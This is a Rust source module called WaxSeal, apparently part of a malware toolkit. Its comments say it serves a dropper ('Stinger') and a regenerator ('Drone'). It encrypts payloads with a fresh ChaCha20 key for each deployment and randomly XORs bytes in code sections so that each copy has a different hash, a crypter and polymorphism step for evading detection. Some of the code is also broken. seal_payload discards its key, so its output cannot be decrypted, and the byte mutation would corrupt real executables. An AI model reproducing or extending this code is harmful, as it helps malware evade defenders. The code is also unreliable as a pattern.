// WaxSeal: encrypts payloads at runtime before spawning.
// Each deployment gets a unique ChaCha20 key → different binary hashes.
// Used by the Stinger (dropper) and Drone (regenerator).

use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use rand::Rng;

/// Generate a random 32-byte ChaCha20 key and 12-byte nonce.
pub fn generate_key() -> ([u8; 32], [u8; 12]) {
    let mut rng = rand::thread_rng();
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    rng.fill(&mut key);
    rng.fill(&mut nonce);
    (key, nonce)
}

/// Encrypt binary payload with ChaCha20. Returns (nonce || ciphertext).
pub fn seal_payload(data: &[u8]) -> Vec<u8> {
    let (key, nonce) = generate_key();
    let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
    let mut ciphertext = data.to_vec();
    cipher.apply_keystream(&mut ciphertext);

    let mut result = Vec::with_capacity(12 + ciphertext.len());
    result.extend_from_slice(&nonce);
    result.extend_from_slice(&ciphertext);
    result
}

/// Decrypt a sealed payload. Input: (nonce || ciphertext). Uses provided key.
pub fn unseal_payload(sealed: &[u8], key: &[u8; 32]) -> Option<Vec<u8>> {
    if sealed.len() < 12 { return None; }
    let nonce: [u8; 12] = sealed[..12].try_into().unwrap();
    let mut ciphertext = sealed[12..].to_vec();

    let mut cipher = ChaCha20::new(key.into(), (&nonce).into());
    cipher.apply_keystream(&mut ciphertext);

    Some(ciphertext)
}

// ── Polymorphic mutation (Weaver-style) ─────────────────────────────────────

/// Mutate binary by XORing ~1% of bytes in code sections.
/// Skips ELF/PE header (first 4KB).
pub fn mutate_binary(data: &[u8]) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut mutated = data.to_vec();
    let skip = 4096.min(data.len());
    for i in skip..data.len() {
        if rng.gen_bool(0.01) {
            mutated[i] ^= rng.gen_range(1..=255);
        }
    }
    mutated
}

/// Full wax sealing: mutate + encrypt. Returns (key, encrypted_payload).
pub fn wax_seal(data: &[u8]) -> ([u8; 32], Vec<u8>) {
    let mutated = mutate_binary(data);
    let (key, nonce) = generate_key();
    let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
    let mut ciphertext = mutated;
    cipher.apply_keystream(&mut ciphertext);

    let mut result = Vec::with_capacity(12 + ciphertext.len());
    result.extend_from_slice(&nonce);
    result.extend_from_slice(&ciphertext);
    (key, result)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_seal_unseal_roundtrip() {
        let data = b"ELF binary data would go here...".to_vec();
        let sealed = seal_payload(&data);
        // Cannot test without the key — but seal generates a random one.
        // This is an integration pattern: key is passed via env var.
        assert!(sealed.len() > data.len());
    }

    #[test]
    fn test_mutation_changes_hash() {
        let data = vec![0u8; 10000];
        let m1 = mutate_binary(&data);
        let m2 = mutate_binary(&data);
        assert_ne!(m1, m2, "Each mutation should produce different output");
        assert_eq!(m1.len(), data.len(), "Mutation should preserve size");
    }

    #[test]
    fn test_wax_seal_produces_unique_output() {
        let data = vec![0x41u8; 5000];
        let (k1, s1) = wax_seal(&data);
        let (k2, s2) = wax_seal(&data);
        assert_ne!(s1, s2, "Each wax seal must be unique");
        assert_ne!(k1, k2, "Each key must be unique");
    }
}
